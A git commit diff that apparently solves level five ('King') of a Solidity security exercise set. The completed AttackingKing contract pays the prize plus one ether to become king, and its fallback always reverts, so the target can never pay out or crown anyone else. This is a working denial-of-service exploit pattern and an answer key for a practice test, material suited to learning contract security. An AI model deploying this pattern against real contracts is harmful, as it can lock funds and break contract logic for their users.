b4881fd4b2c2fe356af77c42572b8c08802218c5
ilija <ilijapet@protonmail.com>
2022-08-30 10:29:45 +0200

    solution for test no 5. King

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -4,13 +4,23 @@ import "./King.sol";
 import "hardhat/console.sol";
 
 contract AttackingKing {
-    address public contractAddress;
+    address payable public contractAddress;
+    uint256 private current_price;
 
-    constructor(address _contractAddress) payable {
+
+    constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
     }
 
     function hackContract() external {
-        // Code me!
+        King king  = King(contractAddress);        
+        current_price = king._prize();
+        (bool sent, bytes memory data) = contractAddress.call{value: current_price + 1 ether}("");
+        require(sent, "Failed to send Ether");
+    }
+
+    fallback() external {
+        revert();
     }
 }
+
